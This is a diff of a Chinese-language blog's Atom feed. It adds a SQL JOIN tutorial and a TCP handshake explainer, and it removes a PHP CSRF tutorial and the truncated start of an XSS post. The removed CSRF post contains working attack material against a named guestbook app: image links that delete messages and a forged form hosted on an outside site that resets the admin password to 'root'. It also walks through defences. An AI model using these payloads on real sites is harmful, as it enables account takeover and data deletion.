@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2018-04-14T02:00:30.899Z</updated>
+  <updated>2018-04-15T06:50:16.357Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -14,6 +14,148 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>数据库|join了解一下</title>
+    <link href="http://yoursite.com/2018/04/15/%E6%95%B0%E6%8D%AE%E5%BA%93-join%E4%BA%86%E8%A7%A3%E4%B8%80%E4%B8%8B/"/>
+    <id>http://yoursite.com/2018/04/15/数据库-join了解一下/</id>
+    <published>2018-04-15T14:05:32.000Z</published>
+    <updated>2018-04-15T06:50:16.357Z</updated>
+    
+    <content type="html"><![CDATA[<p>对于SQL的Join，在学习起来可能是比较乱的。我们知道，SQL的Join语法有很多inner的，有outer的，有left的，有时候，对于Select出来的结果集是什么样子有点不是很清楚。Coding Horror上有<a href="https://blog.codinghorror.com/a-visual-explanation-of-sql-joins/" target="_blank" rel="external">一篇文章</a>通过 文氏图 Venn diagrams 解释了SQL的Join。我觉得清楚易懂，转过来。</p>
+<p>假设我们有两张表。</p>
+<ul>
+<li>Table A 是左边的表。</li>
+<li>Table B 是右边的表。</li>
+</ul>
+<p><img src="/images/sql-join01.png" alt="表数据"></p>
+<p>下面让我们来看看不同的Join会产生什么样的结果。</p>
+<h3 id="Inner-join"><a href="#Inner-join" class="headerlink" title="Inner join"></a>Inner join</h3><pre><code>SELECT * FROM TableA
+INNER JOIN TableB
+ON TableA.name = TableB.name
+
+id  name       id   name
+--  ----       --   ----
+1   Pirate     2    Pirate
+3   Ninja      4    Ninja
+</code></pre><p>Inner join<br>产生的结果集中，是A和B的交集。</p>
+<p><img src="/images/sql-join02.png" alt="Inner join"></p>
+<h3 id="Full-outer-join"><a href="#Full-outer-join" class="headerlink" title="Full outer join"></a>Full outer join</h3><pre><code>SELECT * FROM TableA
+FULL OUTER JOIN TableB
+ON TableA.name = TableB.name
+
+id    name       id    name
+--    ----       --    ----
+1     Pirate     2     Pirate
+2     Monkey     null  null
+3     Ninja      4     Ninja
+4     Spaghetti  null  null
+null  null       1     Rutabaga
+null  null       3     Darth Vader
+</code></pre><p>Full outer join 产生A和B的并集。但是需要注意的是，对于没有匹配的记录，则会以null做为值。</p>
+<p><img src="/images/sql-join03.png" alt="Full join"></p>
+<h4 id="special-use"><a href="#special-use" class="headerlink" title="special use"></a>special use</h4><pre><code>SELECT * FROM TableA
+FULL OUTER JOIN TableB
+ON TableA.name = TableB.name
+WHERE TableA.id IS null
+OR TableB.id IS null
+
+id    name       id    name
+--    ----       --    ----
+2     Monkey     null  null
+4     Spaghetti  null  null
+null  null       1     Rutabaga
+null  null       3     Darth Vader
+</code></pre><p>产生A表和B表都没有出现的数据集。<br><img src="/images/sql-join06.png" alt="Full join"></p>
+<h3 id="LEFT-OUTER-JOIN"><a href="#LEFT-OUTER-JOIN" class="headerlink" title="LEFT OUTER JOIN"></a>LEFT OUTER JOIN</h3><pre><code>SELECT * FROM TableA
+LEFT OUTER JOIN TableB
+ON TableA.name = TableB.name
+
+id  name       id    name
+--  ----       --    ----
+1   Pirate     2     Pirate
+2   Monkey     null  null
+3   Ninja      4     Ninja
+4   Spaghetti  null  null
+</code></pre><p>Left outer join 产生表A的完全集，而B表中匹配的则有值，没有匹配的则以null值取代。</p>
+<p><img src="/images/sql-join04.png" alt="left join"></p>
+<h4 id="special-use-1"><a href="#special-use-1" class="headerlink" title="special use"></a>special use</h4><pre><code>SELECT * FROM TableA
+LEFT OUTER JOIN TableB
+ON TableA.name = TableB.name
+WHERE TableB.id IS null 
+
+id  name       id     name
+--  ----       --     ----
+2   Monkey     null   null
+4   Spaghetti  null   null
+</code></pre><p>产生在A表中有而在B表中没有的集合<br><img src="/images/sql-join05.png" alt="left join"></p>
+<p>还需要知道的是我们还有一个是“交差集” cross join, 这种Join没有办法用文式图表示，因为其就是把表A和表B的数据进行一个N*M的组合，即笛卡尔积。表达式如下：</p>
+<pre><code>SELECT * FROM TableA
+CROSS JOIN TableB
+</code></pre><p>这个笛卡尔乘积会产生 4 x 4 = 16 条记录，一般来说，我们很少用到这个语法。但是我们得小心，如果不是使用嵌套的select语句，一般系统都会产生笛卡尔乘积然再做过滤。这是对于性能来说是非常危险的，尤其是表很大的时候。</p>
+<p><img src="/images/sql-join10.png" alt="cross join"></p>
+<h3 id="了解一下"><a href="#了解一下" class="headerlink" title="了解一下"></a>了解一下</h3><p>通过上面的叙述，不难发现，我们完全可以从集合的角度来理解join的用法，不同的join使用就是为了满足集合的运算。</p>
+<p><img src="/images/sql-join09.png" alt="总结"><br><img src="/images/sql-join07.png" alt="总结"><br><img src="/images/sql-join08.png" alt="总结"></p>
+<h3 id="来个example"><a href="#来个example" class="headerlink" title="来个example"></a>来个example</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">create table table_1 (</div><div class="line">	 `id` INT (11) NOT NULL,</div><div class="line">	user_name varchar(20) NOT NULL</div><div class="line">)</div><div class="line"></div><div class="line">create table table_2 (</div><div class="line">	 `id` INT (11) NOT NULL,</div><div class="line">	user_name varchar(20) NOT NULL</div><div class="line">)</div><div class="line"></div><div class="line"></div><div class="line">set sql_safe_updates=0;</div><div class="line">insert into table_1 values (1,&quot;zhangsan_1_1&quot;),(2,&quot;lisi_1_1&quot;),(3,&quot;wangmazi_1&quot;),(1,&quot;zhangsan_1_2&quot;),(2,&quot;lisi_1_2&quot;);</div><div class="line">select * from table_1</div><div class="line">-- DELETE from table_1</div><div class="line">insert into table_2 values (4,&quot;zhaoliu_2_1&quot;),(2,&quot;lisi_2_1&quot;),(3,&quot;wangmazi_2_1&quot;),(1,&quot;zhangsan_2&quot;),(2,&quot;lisi_2_2&quot;),(4,&quot;zhaoliu_2_2&quot;),(3,&quot;wangmazi_2_2&quot;)</div><div class="line">-- DELETE from table_2</div><div class="line">select * from table_2</div><div class="line">SELECT * FROM table_1 t1 INNER JOIN table_2 t2 ON t1.id = t2.id;</div><div class="line">SELECT * FROM table_1 t1 WHERE EXISTS (SELECT 1 FROM table_2 t2 WHERE t2.id = t1.id );</div><div class="line">-- 结果集：1+2==3</div><div class="line">-- 1、inner join： SELECT * FROM table_1 t1, table_2 t2 where t1.id = t2.id;</div><div class="line">-- 2、anti-join： SELECT * FROM table_1 t1, table_2 t2 where t1.id != t2.id;</div><div class="line">-- 3、cross join：select * from table_1 t1, table_2 t2; -- 不带条件等同于 cross join</div><div class="line"></div><div class="line"></div><div class="line">SELECT * FROM table_1 t1 WHERE EXISTS (SELECT 1 FROM table_2 t2 WHERE t2.id = t1.id );</div><div class="line">1   zhangsan_1_1</div><div class="line">2   lisi_1_1</div><div class="line">3   wangmazi_1</div><div class="line">1   zhangsan_1_2</div><div class="line">2   lisi_1_2</div><div class="line"></div><div class="line"></div><div class="line">SELECT * FROM table_1 t1 INNER JOIN table_2 t2 ON t1.id = t2.id;</div><div class="line">2   lisi_1_1        2   lisi_2_1</div><div class="line">2   lisi_1_2        2   lisi_2_1</div><div class="line">3   wangmazi_1      3   wangmazi_2_1</div><div class="line">1   zhangsan_1_1    1   zhangsan_2</div><div class="line">1   zhangsan_1_2    1   zhangsan_2</div><div class="line">2   lisi_1_1        2   lisi_2_2</div><div class="line">2   lisi_1_2        2   lisi_2_2</div><div class="line">3   wangmazi_1      3   wangmazi_2_2</div></pre></td></tr></table></figure>
+<p><a href="https://my.oschina.net/leejun2005/blog/134719" target="_blank" rel="external">图文并茂教程</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;对于SQL的Join，在学习起来可能是比较乱的。我们知道，SQL的Join语法有很多inner的，有outer的，有left的，有时候，对于Select出来的结果集是什么样子有点不是很清楚。Coding Horror上有&lt;a href=&quot;https://blog.codin
+    
+    </summary>
+    
+      <category term="数据库" scheme="http://yoursite.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+    
+    
+      <category term="数据库" scheme="http://yoursite.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>计算机网络|tcp三次握手四次分手</title>
+    <link href="http://yoursite.com/2018/04/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C-tcp%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%9B%9B%E6%AC%A1%E5%88%86%E6%89%8B/"/>
+    <id>http://yoursite.com/2018/04/15/计算机网络-tcp三次握手四次分手/</id>
+    <published>2018-04-14T22:44:55.000Z</published>
+    <updated>2018-04-15T06:10:35.811Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>TCP(Transmission Control Protocol)　传输控制协议。之前对于TCP的三次握手和四次分手也是模模糊糊，对于其中的细节更是浑然不知，最近看了很多这方面的知识，也在系统的学习计算机网络，加深自己的CS功底，就把看过的一些比较好的东西和自己的一些理解二次加工组织一下然后交流分享，一起学习进步，对了这个面试好像经常问到。</p>
+<h3 id="通俗理解"><a href="#通俗理解" class="headerlink" title="通俗理解"></a>通俗理解</h3><p><img src="/images/tcp三次握手01.png" alt="通俗理解"></p>
+<p>但是为什么一定要进行三次握手来保证连接是双工的呢，一次不行么？两次不行么？我们举一个现实生活中两个人进行语言沟通的例子来模拟三次握手。</p>
+<p>引用网上的一些通俗易懂的例子，虽然不太正确，后面会指出，但是不妨碍我们理解，大体就是这么个理解法。</p>
+<p>第一次对话：<br>老婆让甲出去打酱油，半路碰到一个朋友乙，甲问了一句：哥们你吃饭了么？</p>
+<p>结果乙带着耳机听歌呢，根本没听到，没反应。甲心里想：跟你说话也没个音，不跟你说了，沟通失败。说明乙接受不到甲传过来的信息的情况下沟通肯定是失败的。</p>
+<p>如果乙听到了甲说的话，那么第一次对话成功，接下来进行第二次对话。</p>
+<p>第二次对话：<br>乙听到了甲说的话，但是他是老外，中文不好，不知道甲说的啥意思也不知道怎样回答，于是随便回答了一句学过的中文 ：我去厕所了。甲一听立刻笑喷了，“去厕所吃饭”?道不同不相为谋，离你远点吧，沟通失败。说明乙无法做出正确应答的情况下沟通失败。</p>
+<p>如果乙听到了甲的话，做出了正确的应答，并且还进行了反问：我吃饭了，你呢？那么第二次握手成功。</p>
+<p>通过前两次对话证明了乙能够听懂甲说的话，并且能做出正确的应答。 接下来进行第三次对话。</p>
+<p>第三次对话：<br>甲刚和乙打了个招呼，突然老婆喊他，“你个死鬼，打个酱油咋这么半天，看我回家咋收拾你”，甲是个妻管严，听完吓得二话不说就跑回家了，把乙自己晾那了。乙心想：这什么人啊，得，我也回家吧，沟通失败。说明甲无法做出应答的情况下沟通失败。</p>
+<p>如果甲也做出了正确的应答：我也吃了。那么第三次对话成功，两人已经建立起了顺畅的沟通渠道，接下来开始持续的聊天。</p>
+<p>通过第二次和第三次的对话证明了甲能够听懂乙说的话，并且能做出正确的应答。</p>
+<p>可见，两个人进行有效的语言沟通，这三次对话的过程是必须的。</p>
+<p>为了保证服务端能收接受到客户端的信息并能做出正确的应答而进行前两次(第一次和第二次)握手，为了保证客户端能够接收到服务端的信息并能做出正确的应答而进行后两次(第二次和第三次)握手。</p>
+<p>这个例子举得挺好的。不过个人感觉为什么是三次而不是二次，不是因为为了证明甲能听懂乙并回应（第二次乙能正确的响应甲说明俩人之间沟通已无障碍了），而是怕出现以下情况而浪费感情。这个情景是这样的（例子有点不实际意会就好）：甲在路上跟乙打招呼，由于刮风什么的这句话被吹跑了，然后甲又跟打了个招呼，乙听到了并作出了回应。此时不管是三次握手还是两次握手两个人都能愉快的沟通。0.1秒后俩人四次挥手告别了。此时被风刮跑的那句话又传到了乙的耳朵里，乙认为甲又要跟他沟通，所以做出了响应的回应。（问题出现了）假如采用2次握手，乙就认定了甲要跟他沟通，于是就不停的等，浪费感情。可如果是采用3次握手，乙等了一会后发现甲没有回应他就认为甲走了然后自己也就走了！</p>
+<p>这就很明白了，其实第三步是防止了乙的一直等待而浪费自己的时间，而不是为了保证甲能够正确回应乙的信息。。。后面的也会讲到。</p>
+<p>引用知乎上的别人引用的一个回答，从另外一个角度阐释：</p>
+<blockquote>
+<p>在Google Groups的TopLanguage中看到一帖讨论TCP“三次握手”觉得很有意思。贴主提出“TCP建立连接为什么是三次握手？”的问题，在众多回复中，有一条回复写道：“这个问题的本质是, 信道不可靠, 但是通信双发需要就某个问题达成一致. 而要解决这个问题, 无论你在消息中包含什么信息, 三次通信是理论上的最小值. 所以三次握手不是TCP本身的要求, 而是为了满足”在不可靠信道上可靠地传输信息”这一需求所导致的. 请注意这里的本质需求,信道不可靠, 数据传输要可靠. 三次达到了, 那后面你想接着握手也好, 发数据也好, 跟进行可靠信息传输的需求就没关系了. 因此,如果信道是可靠的, 即无论什么时候发出消息, 对方一定能收到, 或者你不关心是否要保证对方收到你的消息, 那就能像UDP那样直接发送消息就可以了.”。这可视为对“三次握手”目的的另一种解答思路。</p>
+</blockquote>
+<p>上面的纯属大白话娱乐讲解，可能还有偏差，例子可能有点不得体。在我们真正了解TCP的三次握手和四次分手之前，必须了解一些基本的概念，最后和这大白话例子对比结合一下理解，说不定就会顿时融会贯通。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;TCP(Transmission Control Protocol)　传输控制协议。之前对于TCP的三次握手和四次分手也是模模糊糊，对于其中
+    
+    </summary>
+    
+      <category term="计算机网络" scheme="http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
+    
+    
+      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
+    
+  </entry>
   
   <entry>
     <title>爬虫|Requests的使用</title>
@@ -1269,143 +1411,6 @@ $2 = {2, 4, 6}
     
     
       <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PHP|PHP漏洞全解-跨网站请求伪造</title>
-    <link href="http://yoursite.com/2018/03/25/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-%E8%B7%A8%E7%BD%91%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
-    <id>http://yoursite.com/2018/03/25/PHP-PHP漏洞全解-跨网站请求伪造/</id>
-    <published>2018-03-24T18:30:47.000Z</published>
-    <updated>2018-03-24T10:43:45.352Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>CSRF(Cross Site Request Forgeries)，意为跨网站请求伪造，也有写为XSRF。攻击者伪造目标用户的HTTP请求，然后此请求发送到有CSRF漏洞的网站，网站执行此请求后，引发跨站请求伪造攻击。攻击者利用隐蔽的HTTP连接，让目标用户在不注意的情况下单击这个链接，由于是用户自己点击的，而他又是合法用户拥有合法权限，所以目标用户能够在网站内执行特定的HTTP链接，从而达到攻击者的目的。</p>
-<h3 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h3><p>随缘网络PHP留言板V1.0</p>
-<h4 id="任意删除留言"><a href="#任意删除留言" class="headerlink" title="任意删除留言"></a>任意删除留言</h4><pre><code>include_once(&quot;dlyz.php&quot;); //dlyz.php用户验证权限，当权限是admin的时候方可删除留言 
-include_once(&quot;../conn.php&quot;); 
-$del=$_GET[&quot;del&quot;]; 
-$id=$_GET[&quot;id&quot;]; 
-if ($del==&quot;data&quot;) { 
-    $ID_Dele= implode(&quot;,&quot;,$_POST[&apos;adid&apos;]); 
-    $sql=&quot;delete from book where id in (&quot;.$ID_Dele.&quot;)&quot;; 
-    mysql_query($sql); 
-} 
-else { 
-    $sql=&quot;delete from book where id=&quot;.$id; //传递要删除的留言ID 
-    mysql_query($sql); 
-} 
-mysql_close($conn); 
-echo &quot;&quot;; 
-echo &quot;alert(‘删除成功！’);&quot;; 
-echo &quot; location=’book.php’;&quot;; 
-echo &quot;&quot;; 
-?&gt; 
-</code></pre><p>当我们具有admin权限，提交<a href="http://localhost/manage/delbook.php?id=2" target="_blank" rel="external">http://localhost/manage/delbook.php?id=2</a> 时，就会删除id为2的留言。</p>
-<p>利用方法:</p>
-<p>我们使用普通用户留言（源代码方式），内容为。</p>
-<pre><code>&quot;delbook.php?id=2&quot; /&gt; 
-&quot;delbook.php?id=3&quot; /&gt; 
-&quot;delbook.php?id=4&quot; /&gt; 
-&quot;delbook.php?id=5&quot; /&gt; 
-</code></pre><p>插入4张图片链接分别删除4个id留言，然后我们返回首页浏览看，没有什么变化。。(图片显示不了)</p>
-<p>现在我们再用管理员账号登陆后，来刷新首页，会发现留言就剩一条，其他在图片链接中指定的ID号的留言，全部都被删除。</p>
-<p>攻击者在留言中插入隐藏的图片链接，此链接具有删除留言的作用，而攻击者自己访问这些图片链接的时候，是不具有权限的，所以看不到任何效果，但是当管理员登陆后，查看此留言，就会执行隐藏的链接，而他的权限又是足够大的，从而这些留言就被删除了.</p>
-<h4 id="修改管理员密码"><a href="#修改管理员密码" class="headerlink" title="修改管理员密码"></a>修改管理员密码</h4><pre><code>//pass.php 
-if($_GET[&quot;act&quot;]) { 
-    $username=$_POST[&quot;username&quot;]; 
-    $sh=$_POST[&quot;sh&quot;]; 
-    $gg=$_POST[&quot;gg&quot;]; 
-    $title=$_POST[&quot;title&quot;]; 
-    $copyright=$_POST[&quot;copyright&quot;];
-    $password=md5($_POST[&quot;password&quot;]); 
-if(emptyempty($_POST[&quot;password&quot;])) { 
-    $sql=&quot;update gly set username=’&quot;.$username.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; 
-} 
-else { 
-    $sql=&quot;update gly set username=’&quot;.$username.&quot;’,password=’&quot;.$password.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; 
-} 
-mysql_query($sql); 
-mysql_close($conn); 
-echo &quot;&quot;; 
-echo &quot;alert(‘修改成功！’);&quot;; 
-echo &quot; location=’pass.php’;&quot;; 
-echo &quot;&quot;; 
-} 
-</code></pre><p>这个文件用于修改管理密码和网站设置的一些信息，我们可以直接构造如下表单:</p>
-<pre><code>&lt;body&gt; 
-    &lt;form action=&quot;http://localhost/manage/pass.php?act=xg&quot; method=&quot;post&quot; name=&quot;form1&quot; id=&quot;form1&quot;&gt; 
-    &lt;input type=&quot;radio&quot; value=&quot;1&quot; name=&quot;sh&quot;&gt; 
-    &lt;input type=&quot;radio&quot; name=&quot;sh&quot; checked value=&quot;0&quot;&gt; 
-    &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;root&quot;&gt; 
-    &lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;root&quot;&gt; 
-    &lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;随缘网络PHP留言板V1.0(带审核功能)&quot; &gt; 
-    &lt;textarea name=&quot;gg&quot; rows=&quot;6&quot; cols=&quot;80&quot; &gt;欢迎您安装使用随缘网络PHP留言板V1.0(带审核功能)！textarea&gt; 
-    &lt;textarea name=&quot;copyright&quot; rows=&quot;6&quot; cols=&quot;80&quot; &gt;随缘网络PHP留言本V1.0 版权所有：厦门随缘网络科技 2005-2009&lt;br/&gt;承接网站建设及系统定制 提供优惠主机域名textarea&gt; 
-    form&gt; 
-&lt;body&gt; 
-</code></pre><p>存为attack.html，放到自己网站上<a href="http://www.wduozhi.xyz/attack.html，此页面访问后会自动向目标程序的pass.php提交参数，用户名修改为root，密码修改为root，然后我们去留言板发一条留言，隐藏这个链接，管理访问以后，他的用户名和密码全部修改成了root" target="_blank" rel="external">http://www.wduozhi.xyz/attack.html，此页面访问后会自动向目标程序的pass.php提交参数，用户名修改为root，密码修改为root，然后我们去留言板发一条留言，隐藏这个链接，管理访问以后，他的用户名和密码全部修改成了root</a></p>
-<h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><p>防范CSRF要比防范其他攻击更加困难，因为CSRF的HTTP请求虽然是攻击者伪造的，但是却是由目标用户发出的，一般常见的防范方法有下面几种:</p>
-<ol>
-<li>检查网页的来源</li>
-<li>检查内置的隐藏变量</li>
-<li>使用POST，不要使用GET</li>
-</ol>
-<h4 id="检查网页来源"><a href="#检查网页来源" class="headerlink" title="检查网页来源"></a>检查网页来源</h4><p>在//pass.php头部加入以下红色字体代码，验证数据提交</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">if($_GET[&quot;act&quot;]) </div><div class="line">&#123; </div><div class="line">    if(isset($_SERVER[&quot;HTTP_REFERER&quot;])) </div><div class="line">    &#123; </div><div class="line">        $serverhost = $_SERVER[&quot;SERVER_NAME&quot;]; </div><div class="line">        $strurl = str_replace(&quot;http://&quot;,&quot;&quot;,$_SERVER[&quot;HTTP_REFERER&quot;]); </div><div class="line">        $strdomain = explode(&quot;/&quot;,$strurl); </div><div class="line">        $sourcehost = $strdomain[0]; </div><div class="line">    if(strncmp($sourcehost, $serverhost, strlen($serverhost))) </div><div class="line">    &#123;</div><div class="line">        unset($_POST); </div><div class="line">        echo &quot;&quot;; </div><div class="line">        echo &quot;alert(‘数据来源异常!’);&quot;; </div><div class="line">        echo &quot; location=’index.php’;&quot;;</div><div class="line">        echo &quot;&quot;; </div><div class="line">     &#125; </div><div class="line">     &#125; </div><div class="line">    $username=$_POST[&quot;username&quot;]; </div><div class="line">    $sh=$_POST[&quot;sh&quot;]; </div><div class="line">    $gg=$_POST[&quot;gg&quot;]; </div><div class="line">    $title=$_POST[&quot;title&quot;]; </div><div class="line">    $copyright=$_POST[&quot;copyright&quot;].&quot;</div><div class="line">设计制作：厦门随缘网络科技&quot;; </div><div class="line">    $password=md5($_POST[&quot;password&quot;]); </div><div class="line">    if(emptyempty($_POST[&quot;password&quot;])) </div><div class="line">    &#123; </div><div class="line">        $sql=&quot;update gly set username=’&quot;.$username.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; </div><div class="line">    &#125; </div><div class="line">    else </div><div class="line">    &#123; </div><div class="line">        $sql=&quot;update gly set username=’&quot;.$username.&quot;’,password=’&quot;.$password.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; </div><div class="line">    &#125; </div><div class="line">mysql_query($sql); </div><div class="line">mysql_close($conn); </div><div class="line">echo &quot;&quot;; </div><div class="line">echo &quot;alert(‘修改成功！’);&quot;; </div><div class="line">echo &quot; location=’pass.php’;&quot;; </div><div class="line">echo &quot;&quot;; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<h4 id="检查内置隐藏变量"><a href="#检查内置隐藏变量" class="headerlink" title="检查内置隐藏变量"></a>检查内置隐藏变量</h4><p>我们在表单中内置一个隐藏变量和一个session变量，然后检查这个隐藏变量和session变量是否相等，以此来判断是否同一个网页所调用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;?php </div><div class="line">include_once(&quot;dlyz.php&quot;); </div><div class="line">include_once(&quot;../conn.php&quot;); </div><div class="line">if($_GET[&quot;act&quot;]) </div><div class="line">&#123; </div><div class="line">    if (!isset($_SESSION[&quot;post_id&quot;])) </div><div class="line">    &#123; </div><div class="line">        // 生成唯一的ID，并使用MD5来加密 </div><div class="line">        $post_id = md5(uniqid(rand(), true)); </div><div class="line">        // 创建Session变量 </div><div class="line">        $_SESSION[&quot;post_id&quot;] = $post_id; </div><div class="line">    &#125; </div><div class="line">// 检查是否相等 </div><div class="line">if (isset($_SESSION[&quot;post_id&quot;])) </div><div class="line">&#123; </div><div class="line">    // 不相等 </div><div class="line">    if ($_SESSION[&quot;post_id&quot;] != $_POST[&quot;post_id&quot;]) </div><div class="line">    &#123; </div><div class="line">        // 清除POST变量 </div><div class="line">        unset($_POST); </div><div class="line">        echo &quot;&lt;script language=’javascript’&gt;&quot;; </div><div class="line">        echo &quot;alert(‘数据来源异常!’);&quot;; </div><div class="line">        echo &quot; location=’index.php’;&quot;; </div><div class="line">        echo &quot;script&gt;&quot;; </div><div class="line">    &#125; </div><div class="line">&#125; </div><div class="line">…… </div><div class="line">&lt;input type=&quot;reset&quot; name=&quot;Submit2&quot; value=&quot;重 置&quot;&gt; </div><div class="line">&lt;input type=&quot;hidden&quot; name=&quot;post_id&quot; value=&quot;php echo $_SESSION[&quot;post_id&quot;];?&gt;&quot;&gt; </div><div class="line"></div><div class="line">mysql_close($conn); </div><div class="line">?&gt;</div></pre></td></tr></table></figure>
-<h4 id="使用POST，不要使用GET"><a href="#使用POST，不要使用GET" class="headerlink" title="使用POST，不要使用GET"></a>使用POST，不要使用GET</h4><p>传递表单字段时，一定要是用POST，不要使用GET，处理变量也不要直接使用$_REQUEST</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;CSRF(Cross Site Request Forgeries)，意为跨网站请求伪造，也有写为XSRF。攻击者伪造目标用户的HTTP请求
-    
-    </summary>
-    
-      <category term="PHP" scheme="http://yoursite.com/categories/PHP/"/>
-    
-    
-      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>PHP|PHP漏洞全解-跨站脚本攻击XSS</title>
-    <link href="http://yoursite.com/2018/03/24/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBXSS/"/>
-    <id>http://yoursite.com/2018/03/24/PHP-PHP漏洞全解-跨站脚本攻击XSS/</id>
-    <published>2018-03-24T00:29:09.000Z</published>
-    <updated>2018-03-24T10:19:42.120Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>跨站脚本攻击(Cross Site Script为了区别于CSS简称为XSS)指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。</p>
-<h3 id="一个简单的留言板"><a href="#一个简单的留言板" class="headerlink" title="一个简单的留言板"></a>一个简单的留言板</h3><p>我们有个页面用于允许用户发表留言，然后在页面底部显示留言列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div 